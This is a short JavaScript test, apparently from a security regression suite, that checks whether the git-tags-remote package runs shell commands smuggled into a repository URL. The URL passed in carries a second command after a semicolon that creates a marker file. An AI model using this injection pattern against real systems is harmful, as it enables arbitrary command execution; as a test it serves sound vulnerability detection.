test("Command Injection in git-tags-remote", () => {
  expect.assertions(2);
  const gitTagsRemote = require("git-tags-remote");
  const fs = require("fs");
  const path = "./git-tags-remote";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return gitTagsRemote
    .get(
      "https://github.com/sh0ji/git-tags-remote.git; touch git-tags-remote > /tmp/command-injection.test"
    )
    .finally((tags) => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
